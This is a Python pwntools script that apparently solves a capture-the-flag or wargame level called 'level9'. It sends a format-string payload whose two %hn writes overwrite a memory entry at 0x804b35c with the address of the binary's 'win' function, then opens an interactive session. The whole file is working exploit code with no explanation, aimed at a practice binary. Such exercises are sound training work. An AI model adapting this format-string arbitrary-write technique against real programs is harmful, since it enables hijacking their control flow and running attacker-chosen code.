from pwn import *

first_write = 6
second_write = 7

DEBUG = False        
gs = '''
b 23
continue
'''
if DEBUG:
    r = gdb.debug("./level9", gdbscript = gs)
else:
    r = process("./level9")

elf = ELF("./level9")

first_write_loc = 0x804b35c
second_write_loc = 0x804b35e

first_write_val = (elf.sym.win & 0xffff)
second_write_val = ((elf.sym.win >> 16 ) & 0xffff) 


payload = "\x5c\xb3\x04\x08\x5e\xb3\x04\x08"

if first_write_val > second_write_val:
    payload += f"%0{second_write_val- 0x8}x%{second_write}$hn%0{first_write_val-second_write_val}x%{first_write}$hn"
else:
    payload += f"%0{first_write_val- 0x8}x%{first_write}$hn%0{second_write_val - first_write_val}x%{second_write}$hn"

r.sendline(payload)
r.interactive()